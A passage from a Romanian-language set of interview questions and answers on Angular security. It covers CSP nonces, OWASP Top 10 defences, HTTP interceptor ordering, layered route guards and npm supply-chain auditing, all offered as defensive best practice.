2. Nonce-ul este inclus in header-ul CSP: `style-src 'nonce-RANDOM'`
3. Angular primeste nonce-ul prin `CSP_NONCE` token sau atributul `ngCspNonce` pe `<app-root>`
4. Angular adauga nonce-ul la toate stilurile inline generate

**Trusted Types** completeaza CSP prin interzicerea string-urilor in sink-uri DOM periculoase. Angular suporta nativ politica `angular` pentru Trusted Types.

**Important:** `'unsafe-inline'` in `script-src` anuleaza complet protectia CSP impotriva XSS. Folositi mereu nonce sau hash.

---

### 7. Cum protejati o aplicatie Angular impotriva OWASP Top 10?

**Raspuns:**

- **Injection**: Angular compileaza template-urile AOT, prevenind template injection. Evitati `eval()`, `document.write()`, `new Function()`. Validati toate input-urile pe server.
- **Broken Auth**: Token-uri cu expirare scurta, refresh token rotation, rate limiting, MFA. Stocati refresh token in HttpOnly cookie, access token in memorie.
- **Sensitive Data Exposure**: Nu stocati date sensibile client-side. Nu puneti chei API in cod sursa (folositi backend proxy). Asigurati HTTPS peste tot. Nu logati date sensibile.
- **Security Misconfiguration**: CORS restrictiv, source maps dezactivate in productie, headere de securitate (CSP, HSTS, X-Content-Type-Options), dezactivati debug mode.
- **XSS**: Sanitizare automata Angular, evitati bypass fara validare, nu manipulati DOM direct, CSP ca backup.
- **Insecure Deserialization**: Validati toate datele deserializate (Zod, class-validator). Nu executati niciodata cod primit de la server/utilizator.
- **Vulnerable Dependencies**: `npm audit` in CI/CD, Dependabot/Renovate, actualizari regulate, minimizati dependintele.

---

### 8. Explicati ordinea de executie a interceptoarelor si cum le structurati pentru securitate.

**Raspuns:** Interceptoarele se executa in **ordinea din array** la cerere si in **ordine inversa** la raspuns. Structura recomandata:

1. **Logging** (primul) - Logheaza cererea finala cu toate headerele adaugate
2. **Auth** - Adauga `Authorization: Bearer` header
3. **CSRF** - Adauga token-ul CSRF pentru cereri mutative
4. **Cache** - Verifica cache-ul inainte de a trimite cererea
5. **Retry** - Retrimite cereri esuate cu exponential backoff (doar GET)
6. **Error Handling** (ultimul) - Gestioneaza toate erorile, inclusiv cele generate de interceptoarele anterioare

Configurare moderna: `provideHttpClient(withInterceptors([logging, auth, csrf, cache, retry, errorHandling]))`.

**Aspecte critice:**
- Auth interceptorul trebuie sa excluda cererile de login/refresh (altfel bucla infinita)
- Retry-ul trebuie limitat la cereri **idempotente** (GET) si sa nu faca retry la 401/403
- Error handling-ul trebuie sa fie ultimul pentru a prinde erori de la toate interceptoarele
- Logging-ul nu trebuie sa logeze token-uri sau date sensibile

---

### 9. Ce strategii folositi pentru protejarea rutelor intr-o aplicatie Angular enterprise?

**Raspuns:** O strategie multi-layered:

**Layer 1 - CanMatch**: Rute diferite pentru roluri diferite pe aceeasi cale. Previne si preloading-ul modulelor la care utilizatorul nu are acces. Exemplu: `/dashboard` incarca `AdminDashboard` pentru admin si `UserDashboard` pentru user.

**Layer 2 - CanActivate**: Verificare de autentificare si autorizare pe fiecare ruta. Guards compuse: `canActivate: [authGuard, roleGuard]`. Factory pattern pentru reutilizare: `requireRole('admin')`.

**Layer 3 - CanDeactivate**: Prevenirea pierderii datelor nesalvate.

**Layer 4 - Resolve**: Incarcarea datelor necesare inainte de activarea rutei, cu redirect la eroare.

**Important:** Guards sunt protectie **UI-only** (UX, nu securitate reala). Orice verificare de autorizare TREBUIE replicata pe server. Un utilizator avansat poate modifica codul JavaScript in browser si poate ocoli orice guard client-side. Guards protejeaza experienta utilizatorului, server-ul protejeaza datele.

---

### 10. Cum abordati dependency auditing si supply chain security intr-un proiect Angular?

**Raspuns:**

**Prevenire:**
- Minimizati numarul de dependinte. Evaluati alternativele inainte de `npm install`.
- Verificati: data ultimei actualizari, numarul de maintaineri, numarul de dependinte tranzitive.
- Pinuiti versiunile critice de securitate (versiuni exacte, nu ranges).
- Comiteti mereu `package-lock.json` si folositi `npm ci` in CI/CD.

**Detectie:**
- `npm audit` integrat in CI/CD pipeline, cu blocaj pe vulnerabilitati critical/high.
- Snyk sau Dependabot/Renovate pentru monitorizare continua si PR-uri automate.
- Verificari periodice cu `npm outdated` pentru pachete invechite.

**Remediere:**
- Update-uri automate pentru patch versions (Renovate cu automerge pe patch).
- Review manual pentru minor/major updates (pot introduce breaking changes).
- Lock file review la fiecare PR - verificati ce dependinte tranzitive s-au schimbat.
- Plan de upgrade Angular regulat (cel putin la fiecare LTS release).

**Supply chain:** Folositi Subresource Integrity (SRI) pentru CDN-uri. Considerati un registry npm privat (Verdaccio, Artifactory) pentru proiecte enterprise. Verificati ca nu aveti dependinte deprecated sau abandonate.
